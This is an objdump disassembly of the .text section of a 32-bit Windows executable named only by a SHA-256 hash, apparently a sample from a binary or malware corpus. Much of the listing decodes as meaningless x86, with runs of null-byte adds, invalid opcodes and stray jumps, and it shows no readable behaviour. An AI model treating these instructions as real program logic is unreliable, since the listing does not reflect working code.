
6ae58e05e226ed3476b1c3d8463dd49c7ab0aee54164f69b491780c7b4ac59a4.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	adc    BYTE PTR [edx+0x0],bl
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x2b7400
  402013:	add    BYTE PTR [eax],dh
  402015:	sub    eax,0x90000
  40201a:	add    BYTE PTR [eax],al
  40201c:	aaa    
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [esi+0x41],bl
  402052:	or     bh,BYTE PTR [ebx]
  402054:	xchg   DWORD PTR [ebx],ecx
  402056:	cmp    al,0x8a
  402058:	jg     0x4020b3
  40205a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205b:	mov    eax,0xe2a7035e
  402060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402061:	jl     0x401fec
  402063:	dec    esp
  402064:	into   
  402065:	add    eax,DWORD PTR [ecx-0x5c]
  402068:	xlat   BYTE PTR ds:[ebx]
  402069:	dec    edx
  40206a:	ficom  DWORD PTR [ebx+ecx*1-0x47]
  40206e:	pushf  
  40206f:	push   ds
  402070:	outs   dx,DWORD PTR ds:[esi]
  402071:	mov    edi,ecx
  402073:	cmp    DWORD PTR [esi+0x6a64e8bf],0xffffffa8
  40207a:	fmul   st,st(4)
  40207c:	inc    edx
  40207d:	scas   al,BYTE PTR es:[edi]
  40207e:	imul   esp,DWORD PTR [edx],0xa31499ac
  402084:	lock and BYTE PTR [eax-0x133de05d],0xad
  40208c:	jg     0x4020fd
  40208e:	popf   
  40208f:	ins    BYTE PTR es:[edi],dx
  402090:	xchg   ebp,eax
  402091:	out    dx,eax
  402092:	and    al,0x70
  402094:	xor    DWORD PTR [ecx-0x39558181],ebx
  40209a:	dec    ebp
  40209b:	(bad)
  40209f:	faddp  st(3),st
  4020a1:	loopne 0x40211d
  4020a3:	sub    BYTE PTR [ebp-0x2],ah
  4020a6:	xor    DWORD PTR [ecx-0x17],0xba673c1e
  4020ad:	mov    al,ds:0x6fc7538e
  4020b2:	rcl    DWORD PTR [ecx+0x3e],cl
  4020b5:	dec    ebx
  4020b6:	int    0xa8
  4020b8:	and    BYTE PTR [ebx-0x6d],0x7c
  4020bc:	cmp    ch,BYTE PTR [ebx+0x3c]
  4020bf:	in     al,0x6b
  4020c1:	push   ebx
  4020c2:	popf   
  4020c3:	fbstp  TBYTE PTR [ebx+0x14ba31f6]
  4020c9:	push   ebp
  4020ca:	push   ds
  4020cb:	inc    ebx
  4020cc:	pop    eax
  4020cd:	jno    0x402104
  4020cf:	repz jmp 0x40211e
  4020d2:	dec    eax
  4020d3:	jmp    0x55010efd
  4020d8:	or     BYTE PTR [edi+0x2f],bl
  4020db:	cdq    
  4020dc:	jns    0x40213e
  4020de:	or     BYTE PTR [ebp-0x177f598a],bl
  4020e4:	mov    WORD PTR [ebx+0x77afe8f4],?
  4020ea:	adc    eax,0x3a8db5e
  4020ef:	pop    esp
  4020f0:	icebp  
  4020f1:	fidiv  WORD PTR [edx-0x2c]
  4020f4:	xchg   ebx,eax
  4020f5:	mov    edx,0x9d7a0218
  4020fa:	jmp    DWORD PTR [edx-0x2d]
  4020fd:	jecxz  0x4020b7
  4020ff:	out    dx,al
  402100:	adc    eax,0xcad63612
  402105:	test   eax,0x763108bc
  40210a:	test   BYTE PTR [esi+esi*8+0x4cd32801],bl
  402111:	push   edx
  402112:	xor    al,0x5f
  402114:	pop    eax
  402115:	jno    0x4020ac
  402117:	cwde   
  402118:	aad    0xb2
  40211a:	cmc    
  40211b:	lods   eax,DWORD PTR ds:[esi]
  40211c:	inc    ebx
  40211d:	lea    edx,[ecx+edi*4]
  402120:	lods   al,BYTE PTR ds:[esi]
  402121:	or     eax,0x1961e53f
  402126:	std    
  402127:	hlt    
  402128:	dec    edx
  402129:	push   es
  40212a:	arpl   WORD PTR [ecx+0x36],cx
  40212d:	add    ah,al
  40212f:	mov    DWORD PTR [ebx],esp
  402131:	aas    
  402132:	nop
  402133:	xchg   edi,eax
  402134:	mov    eax,0x37d3ad62
  402139:	repz mov esi,0x22731b1e
  40213f:	adc    edi,edi
  402141:	pop    edx
  402142:	cmp    ch,BYTE PTR [ebx+0x13b755f9]
  402148:	mov    eax,0xa88cfcf8
  40214d:	rcr    BYTE PTR [ebx],0x6a
  402150:	retf   0x7302
  402153:	adc    eax,0x7d0a0000
  402158:	add    DWORD PTR [eax],eax
  40215a:	add    BYTE PTR [edx+eax*1],al
  40215d:	jae    0x402175
  40215f:	add    BYTE PTR [eax],al
  402161:	or     bh,BYTE PTR [ebp+0x2]
  402164:	add    BYTE PTR [eax],al
  402166:	add    al,0x2
  402168:	sub    BYTE PTR [edi],dl
  40216a:	add    BYTE PTR [eax],al
  40216c:	or     al,BYTE PTR [ebx]
  40216e:	sub    eax,0x1720b
  402173:	add    BYTE PTR [eax+0x73],dh
  402176:	sbb    BYTE PTR [eax],al
  402178:	add    BYTE PTR [edx],cl
  40217a:	jp     0x40217e
  40217c:	add    edi,DWORD PTR [ebp+0x3]
  40217f:	add    BYTE PTR [eax],al
  402181:	add    al,0x2a
  402183:	add    BYTE PTR [ebx],dl
  402185:	xor    BYTE PTR [ebx],al
  402187:	add    BYTE PTR [esi],dh
  402189:	add    BYTE PTR [eax],al
  40218b:	add    BYTE PTR [ecx],al
  40218d:	add    BYTE PTR [eax],al
  40218f:	adc    DWORD PTR [ebx],eax
  402191:	sub    BYTE PTR [ecx],bl
  402193:	add    BYTE PTR [eax],al
  402195:	or     ch,BYTE PTR [edx+eax*1]
  402198:	adc    al,0x2a
  40219a:	adc    al,0xa
  40219c:	add    bh,BYTE PTR [ebx+0x1]
  40219f:	add    BYTE PTR [eax],al
  4021a1:	add    al,0x3
  4021a3:	adc    al,BYTE PTR [eax]
  4021a5:	outs   dx,DWORD PTR ds:[esi]
  4021a6:	sbb    al,BYTE PTR [eax]
  4021a8:	add    BYTE PTR [edx],cl
  4021aa:	sub    eax,0x28030218
  4021af:	add    al,0x0
  4021b1:	add    BYTE PTR [esi],al
  4021b3:	or     al,BYTE PTR [esi]
  4021b5:	sub    al,0xd
  4021b7:	add    bh,BYTE PTR [ebx+0x1]
  4021ba:	add    BYTE PTR [eax],al
  4021bc:	add    al,0x3
  4021be:	push   es
  4021bf:	outs   dx,DWORD PTR ds:[esi]
  4021c0:	sbb    eax,DWORD PTR [eax]
  4021c2:	add    BYTE PTR [edx],cl
  4021c4:	push   es
  4021c5:	sub    al,BYTE PTR [eax]
  4021c7:	add    BYTE PTR [ebx],dl
  4021c9:	xor    BYTE PTR [ebx],al
  4021cb:	add    BYTE PTR [edi],dh
  4021cd:	add    BYTE PTR [eax],al
  4021cf:	add    BYTE PTR [edx],al
  4021d1:	add    BYTE PTR [eax],al
  4021d3:	adc    DWORD PTR [eax+ebp*1],eax
  4021d6:	sbb    DWORD PTR [eax],eax
  4021d8:	add    BYTE PTR [edx],cl
  4021da:	sub    al,0x2
  4021dc:	adc    al,0x2a
  4021de:	adc    al,0xa
  4021e0:	add    bh,BYTE PTR [ebx+0x2]
  4021e3:	add    BYTE PTR [eax],al
  4021e5:	add    al,0x4
  4021e7:	adc    al,BYTE PTR [eax]
  4021e9:	outs   dx,DWORD PTR ds:[esi]
  4021ea:	sbb    al,0x0
  4021ec:	add    BYTE PTR [edx],cl
  4021ee:	sub    eax,0x4030219
  4021f3:	sub    BYTE PTR [esi],al
  4021f5:	add    BYTE PTR [eax],al
  4021f7:	push   es
  4021f8:	or     al,BYTE PTR [esi]
  4021fa:	sub    al,0xd
  4021fc:	add    bh,BYTE PTR [ebx+0x2]
  4021ff:	add    BYTE PTR [eax],al
  402201:	add    al,0x4
  402203:	push   es
  402204:	outs   dx,DWORD PTR ds:[esi]
  402205:	sbb    eax,0x60a0000
  40220a:	sub    al,BYTE PTR [eax]
  40220c:	adc    esi,DWORD PTR [eax]
  40220e:	add    eax,0x5a00
  402213:	add    BYTE PTR [ebx],al
  402215:	add    BYTE PTR [eax],al
  402217:	adc    DWORD PTR [ebx],eax
  402219:	sub    BYTE PTR [esi],bl
  40221b:	add    BYTE PTR [eax],al
  40221d:	or     cl,BYTE PTR [edx]
  40221f:	push   es
  402220:	adc    al,0x28
  402222:	pop    ds
  402223:	add    BYTE PTR [eax],al
  402225:	or     ch,BYTE PTR [esp+edx*1]
  402228:	add    edx,DWORD PTR [edx+eax*1]
  40222b:	inc    BYTE PTR [esi]
  40222d:	add    eax,0x73060000
  402232:	and    BYTE PTR [eax],al
  402234:	add    BYTE PTR [edx],cl
  402236:	sub    BYTE PTR [ecx],ah
  402238:	add    BYTE PTR [eax],al
  40223a:	or     cl,BYTE PTR [edx]
  40223c:	push   es
  40223d:	adc    al,0x28
  40223f:	pop    ds
  402240:	add    BYTE PTR [eax],al
  402242:	or     ch,BYTE PTR [edx+eax*1]
  402245:	adc    al,0x2a
  402247:	add    al,BYTE PTR [esi]
  402249:	sub    BYTE PTR [edi],al
  40224b:	add    BYTE PTR [eax],al
  40224d:	push   es
  40224e:	sub    al,0x8
  402250:	add    eax,DWORD PTR [esi]
  402252:	jae    0x40225c
  402254:	add    BYTE PTR [eax],al
  402256:	push   es
  402257:	sub    al,BYTE PTR [edx]
  402259:	add    eax,DWORD PTR [esi]
  40225b:	add    al,BYTE PTR [esi]
  40225d:	outs   dx,DWORD PTR ds:[esi]
  40225e:	and    al,BYTE PTR [eax]
  402260:	add    BYTE PTR [edx],cl
  402262:	outs   dx,DWORD PTR ds:[esi]
  402263:	and    eax,DWORD PTR [eax]
  402265:	add    BYTE PTR [edx],cl
  402267:	sub    BYTE PTR [edx],al
  402269:	add    BYTE PTR [eax],al
  40226b:	push   es
  40226c:	jae    0x40228b
  40226e:	add    BYTE PTR [eax],al
  402270:	push   es
  402271:	sub    al,BYTE PTR [eax]
  402273:	add    BYTE PTR [ebx],bl
  402275:	xor    BYTE PTR ds:0xa200,al
  40227b:	add    BYTE PTR [eax+eax*1],al
  40227e:	add    BYTE PTR [ecx],dl
  402280:	sub    BYTE PTR [eax+eax*1],ah
  402283:	add    BYTE PTR [edx],cl
  402285:	jb     0x4022a6
  402287:	add    BYTE PTR [eax],al
  402289:	jo     0x4022a2
  40228b:	lea    eax,[ecx]
  40228d:	add    BYTE PTR [eax],al
  40228f:	add    DWORD PTR ds:0xa2041609,ecx
  402295:	or     DWORD PTR [eax],ebp
  402297:	and    eax,0x280a0000
  40229c:	push   ds
  40229d:	add    BYTE PTR [eax],al
  40229f:	or     cl,BYTE PTR [edx]
  4022a1:	adc    al,0x6
  4022a3:	sub    BYTE PTR [esi],ah
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	or     ch,BYTE PTR [esp+eax*1]
  4022aa:	push   es
  4022ab:	or     al,0xde
  4022ad:	jb     0x40228d
  4022af:	add    esp,DWORD PTR [esi]
  4022b1:	fiadd  WORD PTR [eax]
  4022b3:	add    bh,BYTE PTR [ebx+0x3]
  4022b6:	add    BYTE PTR [eax],al
  4022b8:	add    al,0x6f
  4022ba:	daa    
  4022bb:	add    BYTE PTR [eax],al
  4022bd:	or     dl,BYTE PTR [ebx]
  4022bf:	add    al,0x2b
  4022c1:	inc    ebx
  4022c2:	adc    al,BYTE PTR [eax+ebp*1]
  4022c5:	sub    BYTE PTR [eax],al
  4022c7:	add    BYTE PTR [edx],cl
  4022c9:	or     ebp,DWORD PTR [eax]
  4022cb:	and    al,0x0
  4022cd:	add    BYTE PTR [edx],cl
  4022cf:	jb     0x402252
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	jo     0x4022ed
  4022d5:	lea    eax,[ecx]
  4022d7:	add    BYTE PTR [eax],al
  4022d9:	add    DWORD PTR [ebx],edx
  4022db:	add    eax,0x4160511
  4022e0:	mov    ds:0x7170511,al
  4022e5:	mov    ds:0x25280511,al
  4022ea:	add    BYTE PTR [eax],al
  4022ec:	or     ch,BYTE PTR [eax]
  4022ee:	push   ds
  4022ef:	add    BYTE PTR [eax],al
  4022f1:	or     cl,BYTE PTR [edx]
  4022f3:	push   es
  4022f4:	adc    al,0x28
  4022f6:	add    BYTE PTR es:[eax],al
  4022f9:	or     ch,BYTE PTR [esp+eax*1]
  4022fc:	push   es
  4022fd:	or     al,0xde
  4022ff:	and    dh,bl
  402301:	add    esp,DWORD PTR [esi]
  402303:	fiadd  WORD PTR [eax]
  402305:	adc    al,BYTE PTR [eax+ebp*1]
  402308:	sub    DWORD PTR [eax],eax
  40230a:	add    BYTE PTR [edx],cl
  40230c:	sub    eax,0x120edeb4
  402311:	add    al,0xfe
  402313:	push   ss
  402314:	add    eax,0x6f1b0000
  402319:	sub    al,BYTE PTR [eax]
  40231b:	add    BYTE PTR [edx],cl
  40231d:	fcom   QWORD PTR [edx+ebp*1]
  402320:	or     BYTE PTR [edx],ch
  402322:	add    BYTE PTR [eax],al
  402324:	add    DWORD PTR [eax],ebp
  402326:	add    BYTE PTR [eax],al
  402328:	add    BYTE PTR [eax],al
  40232a:	add    BYTE PTR [eax],al
  40232c:	xor    BYTE PTR [eax],dh
  40232e:	add    BYTE PTR [ebx],al
  402330:	das    
  402331:	add    BYTE PTR [eax],al
  402333:	add    DWORD PTR [eax],eax
  402335:	add    BYTE PTR [edx+0x0],cl
  402338:	cmp    BYTE PTR [edx+0x2f0300],al
  40233e:	add    BYTE PTR [ecx],al
  402340:	add    al,BYTE PTR [eax]
  402342:	inc    eax
  402343:	add    BYTE PTR [eax-0x70],dl
  402346:	add    BYTE PTR [esi],cl
  402348:	add    BYTE PTR [eax],al
  40234a:	add    BYTE PTR [eax],al
  40234c:	jb     0x402351
  40234e:	adc    al,0x28
  402350:	pop    ds
  402351:	add    BYTE PTR [eax],al
  402353:	or     ch,BYTE PTR ds:0x19280408
  402359:	add    BYTE PTR [eax],al
  40235b:	or     ch,BYTE PTR [edx+eax*1]
  40235e:	adc    al,0x2a
  402360:	add    al,BYTE PTR [ebx+eax*1]
  402363:	jae    0x402393
  402365:	add    BYTE PTR [eax],al
  402367:	push   es
  402368:	sub    al,BYTE PTR [eax]
  40236a:	add    BYTE PTR [eax],al
  40236c:	adc    esi,DWORD PTR [eax]
  40236e:	add    eax,DWORD PTR [eax]
  402370:	xor    al,BYTE PTR [eax]
  402372:	add    BYTE PTR [eax],al
  402374:	add    eax,0x3110000
  402379:	outs   dx,DWORD PTR ds:[esi]
  40237a:	sub    eax,DWORD PTR [eax]
  40237c:	add    BYTE PTR [edx],cl
  40237e:	or     al,BYTE PTR [esi]
  402380:	jb     0x402315
  402382:	add    BYTE PTR [eax],al
  402384:	jo     0x40239f
  402386:	outs   dx,DWORD PTR ds:[esi]
  402387:	sub    al,0x0
  402389:	add    BYTE PTR [edx],cl
  40238b:	sub    eax,0xb372061b
  402390:	add    BYTE PTR [eax],al
  402392:	jo     0x4023ad
  402394:	outs   dx,DWORD PTR ds:[esi]
  402395:	sub    al,0x0
  402397:	add    BYTE PTR [edx],cl
  402399:	sub    eax,0xd972060d
  40239e:	add    BYTE PTR [eax],al
  4023a0:	jo     0x4023bb
  4023a2:	outs   dx,DWORD PTR ds:[esi]
  4023a3:	sub    al,0x0
  4023a5:	add    BYTE PTR [edx],cl
  4023a7:	sub    dl,BYTE PTR [edi]
  4023a9:	sub    dl,BYTE PTR [esi+0x2]
  4023ac:	sub    BYTE PTR [edi],dl
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	or     al,BYTE PTR [edx]
  4023b2:	add    edi,DWORD PTR [ebp+0x4]
  4023b5:	add    BYTE PTR [eax],al
  4023b7:	add    al,0x2
  4023b9:	add    al,0x7d
  4023bb:	add    eax,0x2a040000
  4023c0:	or     dl,BYTE PTR [edi]
  4023c2:	sub    bl,BYTE PTR [esi]
  4023c4:	add    bh,BYTE PTR [ebx+0x4]
  4023c7:	add    BYTE PTR [eax],al
  4023c9:	add    al,0x2a
  4023cb:	add    BYTE PTR [ebx],dl
  4023cd:	xor    BYTE PTR [ebx],al
  4023cf:	add    BYTE PTR [eax],ch
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    BYTE PTR [esi],al
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	adc    DWORD PTR [edx],eax
  4023d9:	jnp    0x4023df
  4023db:	add    BYTE PTR [eax],al
  4023dd:	add    al,0x1f
  4023df:	outs   dx,DWORD PTR cs:[esi]
  4023e1:	sub    eax,0xa0a0000
  4023e6:	push   es
  4023e7:	adc    eax,0x7b020733
  4023ec:	add    al,0x0
  4023ee:	add    BYTE PTR [edx+ebp*1],al
  4023f1:	add    bh,BYTE PTR [ebx+0x4]
  4023f4:	add    BYTE PTR [eax],al
  4023f6:	add    al,0x6
  4023f8:	pop    ss
  4023f9:	pop    eax
  4023fa:	outs   dx,DWORD PTR ds:[esi]
  4023fb:	add    BYTE PTR cs:[eax],al
  4023fe:	or     ch,BYTE PTR [edx]
  402400:	push   ds
  402401:	add    bh,BYTE PTR [ebx+0x5]
  402404:	add    BYTE PTR [eax],al
  402406:	add    al,0x2a
  402408:	or     dl,BYTE PTR [edx+ebp*1]
  40240b:	sbb    dh,BYTE PTR [ebx+0x2f]
  40240e:	add    BYTE PTR [eax],al
  402410:	or     bh,BYTE PTR [edx+0x1a]
  402413:	jae    0x402444
  402415:	add    BYTE PTR [eax],al
  402417:	or     bh,BYTE PTR [edx+0x1a]
  40241a:	jae    0x40244b
  40241c:	add    BYTE PTR [eax],al
  40241e:	or     bh,BYTE PTR [edx+0x1a]
  402421:	jae    0x402452
  402423:	add    BYTE PTR [eax],al
  402425:	or     bh,BYTE PTR [edx+0x1a]
  402428:	jae    0x402459
  40242a:	add    BYTE PTR [eax],al
  40242c:	or     bh,BYTE PTR [edx+0x1a]
  40242f:	jae    0x402460
  402431:	add    BYTE PTR [eax],al
  402433:	or     bh,BYTE PTR [edx+0x1a]
  402436:	jae    0x402467
  402438:	add    BYTE PTR [eax],al
  40243a:	or     bh,BYTE PTR [edx+0x1a]
  40243d:	jae    0x40246e
  40243f:	add    BYTE PTR [eax],al
  402441:	or     bh,BYTE PTR [edx+0x1a]
  402444:	jae    0x402475
  402446:	add    BYTE PTR [eax],al
  402448:	or     bh,BYTE PTR [edx+0x1a]
  40244b:	jae    0x40247c
  40244d:	add    BYTE PTR [eax],al
  40244f:	or     bh,BYTE PTR [edx+0x1a]
  402452:	jae    0x402483
  402454:	add    BYTE PTR [eax],al
  402456:	or     bh,BYTE PTR [edx+0x1a]
  402459:	jae    0x40248a
  40245b:	add    BYTE PTR [eax],al
  40245d:	or     bh,BYTE PTR [edx+0x1a]
  402460:	jae    0x402491
  402462:	add    BYTE PTR [eax],al
  402464:	or     bh,BYTE PTR [edx+0x1a]
  402467:	jae    0x402498
  402469:	add    BYTE PTR [eax],al
  40246b:	or     bh,BYTE PTR [edx+0x1a]
  40246e:	jae    0x40249f
  402470:	add    BYTE PTR [eax],al
  402472:	or     bh,BYTE PTR [edx+0x13]
  402475:	xor    BYTE PTR [ebx],al
  402477:	add    dl,bl
  402479:	add    BYTE PTR [eax],al
  40247b:	add    BYTE PTR [edi],al
  40247d:	add    BYTE PTR [eax],al
  40247f:	adc    DWORD PTR [edx],eax
  402481:	add    al,0x5
  402483:	sub    BYTE PTR [eax],cl
  402485:	add    BYTE PTR [eax],al
  402487:	push   es
  402488:	add    al,BYTE PTR [ebx]
  40248a:	jge    0x402492
  40248c:	add    BYTE PTR [eax],al
  40248e:	add    al,0x2
  402490:	push   cs
  402491:	add    al,0x7d
  402493:	pop    es
  402494:	add    BYTE PTR [eax],al
  402496:	add    al,0x2
  402498:	add    eax,0xe772
  40249d:	jo     0x4024c7
  40249f:	add    DWORD PTR [eax],eax
  4024a1:	add    BYTE PTR [ebx],ch
  4024a3:	or     al,BYTE PTR [esi]
  4024a5:	sub    al,0x7
  4024a7:	add    al,BYTE PTR [esi]
  4024a9:	jge    0x4024b3
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	add    al,0x2
  4024af:	add    eax,0x307e
  4024b4:	or     ch,BYTE PTR [edi+0x31]
  4024b7:	add    BYTE PTR [eax],al
  4024b9:	or     bh,BYTE PTR [ebp+0xb]
  4024bc:	add    BYTE PTR [eax],al
  4024be:	add    al,0x5
  4024c0:	rol    BYTE PTR [esi],1
  4024c2:	add    BYTE PTR [eax],al
  4024c4:	sbb    ebp,DWORD PTR [eax]
  4024c6:	xor    al,BYTE PTR [eax]
  4024c8:	add    BYTE PTR [edx],cl
  4024ca:	outs   dx,DWORD PTR ds:[esi]
  4024cb:	xor    eax,DWORD PTR [eax]
  4024cd:	add    BYTE PTR [edx],cl
  4024cf:	outs   dx,DWORD PTR ds:[esi]
  4024d0:	xor    al,0x0
  4024d2:	add    BYTE PTR [edx],cl
  4024d4:	or     eax,DWORD PTR [edi]
  4024d6:	adc    al,0x28
  4024d8:	add    BYTE PTR es:[eax],al
  4024db:	or     ch,BYTE PTR [esp+esi*1]
  4024de:	add    al,BYTE PTR [edi]
  4024e0:	jb     0x4024d3
  4024e2:	add    BYTE PTR [eax],al
  4024e4:	jo     0x402555
  4024e6:	xor    eax,0x7d0a0000
  4024eb:	or     al,0x0
  4024ed:	add    BYTE PTR [edi+eax*1],al
  4024f0:	outs   dx,DWORD PTR ds:[esi]
  4024f1:	add    BYTE PTR ss:[eax],al
  4024f4:	or     cl,BYTE PTR [edx+eax*1]
  4024f7:	or     BYTE PTR [esi],dl
  4024f9:	call   0x7d0a:0x2b6f
  402500:	or     al,BYTE PTR [eax]
  402502:	add    BYTE PTR [edx+eax*1],al
  402505:	or     BYTE PTR [edi],dl
  402507:	call   0x7d0a:0x2b6f
  40250e:	or     DWORD PTR [eax],eax
  402510:	add    BYTE PTR [eax*1+0x7d0],al
  402517:	sbb    ebp,DWORD PTR [eax]
  402519:	xor    al,BYTE PTR [eax]
  40251b:	add    BYTE PTR [edx],cl
  40251d:	outs   dx,DWORD PTR ds:[esi]
  40251e:	xor    eax,DWORD PTR [eax]
  402520:	add    BYTE PTR [edx],cl
  402522:	outs   dx,DWORD PTR ds:[esi]
  402523:	xor    al,0x0
  402525:	add    BYTE PTR [edx],cl
  402527:	or     eax,0x26281409
  40252c:	add    BYTE PTR [eax],al
  40252e:	or     ch,BYTE PTR [eax+ebp*1]
  402531:	add    cl,BYTE PTR [ecx]
  402533:	jb     0x402526
  402535:	add    BYTE PTR [eax],al
  402537:	jo     0x4025a8
  402539:	xor    eax,0x7d0a0000
  40253e:	or     eax,0x9040000
  402543:	outs   dx,DWORD PTR ds:[esi]
  402544:	add    BYTE PTR ss:[eax],al
  402547:	or     dl,BYTE PTR [ebx]
  402549:	add    al,0x2
  40254b:	adc    DWORD PTR [esi+edx*1],eax
  40254e:	call   0x7d0a:0x2b6f
  402555:	or     DWORD PTR [eax],eax
  402557:	add    BYTE PTR [edx+ebp*1],al
  40255a:	add    BYTE PTR [eax],al
  40255c:	sbb    esi,DWORD PTR [eax]
  40255e:	add    al,BYTE PTR [eax]
  402560:	lods   eax,DWORD PTR ds:[esi]
  402561:	add    BYTE PTR [eax],al
  402563:	add    BYTE PTR [eax],cl
  402565:	add    BYTE PTR [eax],al
  402567:	adc    DWORD PTR [ebx],eax
  402569:	outs   dx,DWORD PTR ds:[esi]
  40256a:	aaa    
  40256b:	add    BYTE PTR [eax],al
  40256d:	or     cl,BYTE PTR [edx]
  40256f:	push   es
  402570:	outs   dx,DWORD PTR ds:[esi]
  402571:	cmp    BYTE PTR [eax],al
  402573:	add    BYTE PTR [edx],cl
  402575:	adc    eax,DWORD PTR [ebx+ebp*1]
  402578:	jle    0x40258b
  40257a:	add    al,0x6f
  40257c:	cmp    DWORD PTR [eax],eax
  40257e:	add    BYTE PTR [edx],cl
  402580:	or     eax,DWORD PTR [edi]
  402582:	outs   dx,DWORD PTR ds:[esi]
  402583:	cmp    al,BYTE PTR [eax]
  402585:	add    BYTE PTR [edx],cl
  402587:	outs   dx,DWORD PTR ds:[esi]
  402588:	cmp    eax,DWORD PTR [eax]
  40258a:	add    BYTE PTR [edx],cl
  40258c:	ror    BYTE PTR [edx],1
  40258e:	add    BYTE PTR [eax],al
  402590:	sbb    ebp,DWORD PTR [eax]
  402592:	xor    al,BYTE PTR [eax]
  402594:	add    BYTE PTR [edx],cl
  402596:	sub    BYTE PTR [esi],ah
  402598:	add    BYTE PTR [eax],al
  40259a:	or     ch,BYTE PTR ds:0x3c6f075a
  4025a0:	add    BYTE PTR [eax],al
  4025a2:	or     ch,BYTE PTR [edi+0x3d]
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	or     dl,BYTE PTR [ebx]
  4025a9:	add    eax,0x511342b
  4025ae:	outs   dx,DWORD PTR ds:[esi]
  4025af:	add    BYTE PTR ds:[eax],al
  4025b2:	or     cl,BYTE PTR [edx+edx*1]
  4025b5:	add    ch,BYTE PTR [eax]
  4025b7:	aas    
  4025b8:	add    BYTE PTR [eax],al
  4025ba:	or     ch,BYTE PTR [edi+0x33]
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	or     al,BYTE PTR [eax+ebp*1]
  4025c2:	inc    eax
  4025c3:	add    BYTE PTR [eax],al
  4025c5:	or     ch,BYTE PTR ds:0x28021218
  4025cb:	inc    ecx
  4025cc:	add    BYTE PTR [eax],al
  4025ce:	or     dl,BYTE PTR [ebx]
  4025d0:	push   es
  4025d1:	adc    al,BYTE PTR [esi]
  4025d3:	sub    BYTE PTR [edx+0x0],al
  4025d6:	add    BYTE PTR [edx],cl
  4025d8:	je     0x402601
  4025da:	add    BYTE PTR [eax],al
  4025dc:	add    DWORD PTR ds:0x51133de,ecx
  4025e2:	outs   dx,DWORD PTR ds:[esi]
  4025e3:	inc    ebx
  4025e4:	add    BYTE PTR [eax],al
  4025e6:	or     ch,BYTE PTR ds:0x110cdec3
  4025ec:	add    eax,0x511072c
  4025f1:	outs   dx,DWORD PTR ds:[esi]
  4025f2:	sub    al,BYTE PTR [eax]
  4025f4:	add    BYTE PTR [edx],cl
  4025f6:	fcom   QWORD PTR [ecx]
  4025f8:	add    al,0x6f
  4025fa:	inc    ebx
  4025fb:	add    BYTE PTR [eax],al
  4025fd:	or     bh,BYTE PTR [edx]
  4025ff:	jbe    0x402600
  402601:	(bad)  
  402602:	(bad)  
  402603:	fimul  WORD PTR [ecx+edx*1]
  402606:	add    al,0x2c
  402608:	pop    es
  402609:	adc    DWORD PTR [edi+ebp*2],eax
  40260c:	sub    al,BYTE PTR [eax]
  40260e:	add    BYTE PTR [edx],cl
  402610:	fcom   QWORD PTR [edx+ebp*1]
  402613:	or     DWORD PTR [edx],ebp
  402615:	add    BYTE PTR [eax],al
  402617:	add    BYTE PTR [ecx],al
  402619:	sbb    al,0x0
  40261b:	add    BYTE PTR [edx],al
  40261d:	add    BYTE PTR [edx+0x0],al
  402620:	inc    ecx
  402621:	add    DWORD PTR [eax],0xc
  402624:	add    BYTE PTR [eax],al
  402626:	add    BYTE PTR [eax],al
  402628:	add    al,BYTE PTR [eax]
  40262a:	str    WORD PTR [esi+0xc009d]
  402631:	add    BYTE PTR [eax],al
  402633:	add    BYTE PTR [edx],cl
  402635:	push   ss
  402636:	sub    bl,BYTE PTR [esi]
  402638:	add    bh,BYTE PTR [ebx+0x7]
  40263b:	add    BYTE PTR [eax],al
  40263d:	add    al,0x2a
  40263f:	bound  eax,QWORD PTR [edx]
  402641:	jnp    0x402649
  402643:	add    BYTE PTR [eax],al
  402645:	add    al,0x2
  402647:	sub    BYTE PTR [eax+eax*1],cl
  40264a:	add    BYTE PTR [esi],al
  40264c:	add    bh,BYTE PTR [ebx+0x8]
  40264f:	add    BYTE PTR [eax],al
  402651:	add    al,0x6f
  402653:	add    eax,DWORD PTR [eax]
  402655:	add    BYTE PTR [esi],al
  402657:	sub    dh,BYTE PTR [edx]
  402659:	add    ch,BYTE PTR [eax]
  40265b:	or     al,0x0
  40265d:	add    BYTE PTR [esi],al
  40265f:	outs   dx,DWORD PTR ds:[esi]
  402660:	inc    esp
  402661:	add    BYTE PTR [eax],al
  402663:	or     ch,BYTE PTR [edx]
  402665:	or     dl,BYTE PTR [esi]
  402667:	sub    dh,BYTE PTR [esi]
  402669:	add    bh,BYTE PTR [ebx+0xd]
  40266c:	add    BYTE PTR [eax],al
  40266e:	add    al,0x14
  402670:	sub    BYTE PTR [ebp+0x0],al
  402673:	add    BYTE PTR [edx],cl
  402675:	sub    dh,BYTE PTR [esi]
  402677:	add    bh,BYTE PTR [ebx+0xb]
  40267a:	add    BYTE PTR [eax],al
  40267c:	add    al,0x14
  40267e:	sub    BYTE PTR [esi+0x0],al
  402681:	add    BYTE PTR [edx],cl
  402683:	sub    dh,BYTE PTR [esi]
  402685:	add    bh,BYTE PTR [ebx+0xc]
  402688:	add    BYTE PTR [eax],al
  40268a:	add    al,0x14
  40268c:	sub    BYTE PTR [ebp+0x0],al
  40268f:	add    BYTE PTR [edx],cl
  402691:	sub    cl,BYTE PTR [edx+0x2]
  402694:	jnp    0x40269c
  402696:	add    BYTE PTR [eax],al
  402698:	add    al,0x2
  40269a:	jnp    0x4026a6
  40269c:	add    BYTE PTR [eax],al
  40269e:	add    al,0x6f
  4026a0:	add    al,BYTE PTR [eax]
  4026a2:	add    BYTE PTR [esi],al
  4026a4:	sub    cl,BYTE PTR [edx+0x2]
  4026a7:	jnp    0x4026af
  4026a9:	add    BYTE PTR [eax],al
